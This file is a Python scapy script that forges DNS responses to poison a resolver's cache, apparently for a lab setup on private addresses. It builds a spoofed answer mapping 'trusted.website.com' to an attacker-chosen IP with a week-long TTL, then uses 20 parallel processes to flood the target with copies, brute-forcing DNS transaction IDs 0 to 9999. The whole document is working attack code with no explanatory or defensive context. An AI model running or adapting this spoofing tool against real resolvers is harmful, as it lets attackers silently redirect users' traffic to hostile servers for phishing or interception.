from scapy.all import *
import multiprocessing as mp

src_ip="192.168.0.100"
dst_ip="192.168.0.200"

src_port=53
dst_port=6666

#precompute standard object
response=(IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port,sport=src_port)/DNS(id=1, qr=1, aa=1, qd=1, an=DNSRR(rrname='trusted.website.com', ttl=604769, rdata="192.168.0.151")))
dns_layer = response[DNS]

#list of messages
pkt_list = []
s = conf.L3socket()

def attack(start, end):
	start_time = time.time()
	for i in range (start,end,1):
		#update the qid and add to the list
		dns_layer.id = i
		s.send(response)

	end_time = time.time()
	print(end_time - start_time)


if __name__ == "__main__":
	mp.set_start_method('spawn')
	for i in range(0,20,1):
		mp.Process(target=attack, args=((i*500), (i+1)*500)).start()
